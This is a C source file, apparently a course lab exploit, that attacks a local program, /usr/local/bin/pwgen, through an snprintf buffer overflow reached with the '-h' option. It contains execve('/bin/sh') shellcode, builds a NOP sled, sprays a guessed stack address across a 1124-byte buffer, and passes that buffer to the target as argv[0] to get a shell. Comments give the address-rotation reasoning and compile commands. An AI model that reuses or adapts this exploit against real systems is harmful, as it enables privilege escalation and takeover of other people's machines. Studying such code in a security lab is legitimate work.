#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <math.h>
//#include shellcode.h

#define DEFAULT_OFFSET 0
#define DEFAULT_BUFFER_SIZE 1124
#define NOP 0x90

static char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh"
  "\x90\x90\x90";

unsigned long get_sp() {
    __asm__("movl %esp,%eax");
}


// this code specifically targets the vulnerability of snprintf with an oversized buffer
// found on line 302
int main(int argc, char *argv[]) {
    char *buff, *ptr, *endofsled;
    long *addr_ptr, addr, save;
    int offset=DEFAULT_OFFSET;
    int bsize=DEFAULT_BUFFER_SIZE;
    int i;
    char *args[4];

    
    if (!(buff = malloc(bsize))) {
        printf("Can't allocate memory. \n");
        exit(0);
    }

    // the problem is that the sp is 0xffbfd876 but rewritten as 0x76ffbf68
    addr = get_sp(); // - offset;
    // now because the program hates me we need to rotate left by 2
    // using bit shits
    save = (addr >> 28) & 0x0F;
    addr <<= 4;
    addr |= save;
    save = (addr >> 28) & 0x0F;
    addr <<= 4;
    addr |= save;

    //bottom of stack pointer
    printf("Using address: 0x%x\n", addr);

    // ptr is the beginning of the buffer that we want to write to overwrite the program stack
    ptr = buff;
    addr_ptr = (long *) ptr;
    // each byte of the buffer will point to the address of the shellcode payload
    for (i = 0; i < bsize; i += 4) *(addr_ptr++) = (long) addr;

    /* this code creates a NOP sled by copying NOP for the first half of the buffer */
    memset(buff, NOP, bsize/2);
	/* then places the shellcode */
	endofsled = buff + (bsize/2 - strlen(shellcode)/2);
	memcpy(endofsled, shellcode, strlen(shellcode));

    buff[bsize - 1] = '\0';

    // create arguments list for execve
    // we want to make the pwgen program go to the function that is called when -h is used as an argument
    // we also want arg[0] to be our shellcode injection because the function reads arg[0] for snprintf
    args[0] = buff;
    args[1] = "/usr/local/bin/pwgen";
    args[2] = "-h";
    args[3] = NULL;

    execve(args[1], args, NULL);

    // ch /share && gcc -Wall -ggdb /share/sploit1.c -o /home/user/sploit1
    // /home/user/sploit1
    // if execve returns it means that we have failed
    return 1;

}
